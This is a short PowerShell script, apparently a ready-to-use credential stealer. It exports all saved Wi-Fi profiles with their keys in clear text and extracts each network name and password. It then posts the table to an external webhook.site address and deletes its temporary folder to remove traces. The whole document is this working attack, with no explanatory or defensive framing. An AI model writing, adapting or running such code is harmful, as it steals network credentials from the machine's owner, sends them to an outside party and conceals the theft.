$p = "$env:temp\p"
if (!(Test-Path $p)) { md $p | Out-Null }
cd $p
netsh wlan export profile key=clear | Out-Null
$r = Get-ChildItem | ForEach-Object {
    $x = [xml](Get-Content $_.FullName)
    [PSCustomObject]@{
        Name     = $x.WLANProfile.Name
        Password = $x.WLANProfile.MSM.Security.SharedKey.KeyMaterial
    }
}
$fence = [string][char]96 * 3
$body  = @{ content = $fence + ($r | Format-Table | Out-String) + $fence } | ConvertTo-Json -Depth 3
Invoke-RestMethod -Uri 'https://webhook.site/3e30b3d0-304b-4218-b056-44158ad60822' `
                  -Method Post -Body $body -ContentType 'application/json'
cd ..
Remove-Item $p -Recurse -Force

